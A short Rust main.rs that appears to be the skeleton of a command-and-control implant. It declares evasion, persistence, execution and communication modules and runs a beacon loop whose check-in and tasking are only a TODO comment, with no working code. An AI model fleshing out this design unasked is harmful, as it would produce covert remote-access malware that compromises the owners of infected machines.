mod communication;
mod config;
mod evasion;
mod execution;
mod persistence;

use std::time::Duration;

#[tokio::main]
async fn main() {
    let interval = Duration::from_millis(config::BEACON_INTERVAL_MS);
    loop {
        // TODO: beacon check-in, receive tasks, dispatch to execution modules
        tokio::time::sleep(interval).await;
    }
}
